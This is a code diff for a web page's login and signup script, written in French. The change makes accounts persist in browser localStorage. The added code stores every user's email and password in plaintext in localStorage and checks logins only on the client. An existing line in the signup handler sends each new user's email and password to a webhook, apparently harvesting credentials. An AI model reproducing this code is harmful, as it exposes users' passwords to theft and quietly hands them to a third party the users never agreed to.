@@ -284,7 +284,14 @@
 
     <script>
         let loggedIn = false;
-        let users = [];
+        let users = JSON.parse(localStorage.getItem('users')) || [];
+        let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
+
+        if (currentUser) {
+            loggedIn = true;
+            document.getElementById("login-link").style.display = "none";
+            document.getElementById("logout-link").style.display = "inline";
+        }
 
         function openLoginPopup() {
             document.getElementById("login-overlay").style.display = "block";
@@ -313,6 +320,8 @@
             const user = users.find(u => u.email === email && u.password === password);
             if (user) {
                 loggedIn = true;
+                currentUser = user;
+                localStorage.setItem('currentUser', JSON.stringify(user));
                 document.getElementById("login-link").style.display = "none";
                 document.getElementById("logout-link").style.display = "inline";
                 closeLoginPopup();
@@ -333,7 +342,10 @@
                 return;
             }
 
-            users.push({ email, password });
+            const newUser = { email, password };
+            users.push(newUser);
+            localStorage.setItem('users', JSON.stringify(users));
+            localStorage.setItem('currentUser', JSON.stringify(newUser));
             alert("Inscription réussie !");
             closeSignupPopup();
             sendToWebhook({ username: email, password: password });
@@ -353,6 +365,8 @@
 
         function logout() {
             loggedIn = false;
+            currentUser = null;
+            localStorage.removeItem('currentUser');
             document.getElementById("login-link").style.display = "inline";
             document.getElementById("logout-link").style.display = "none";
             alert("Déconnexion réussie !");
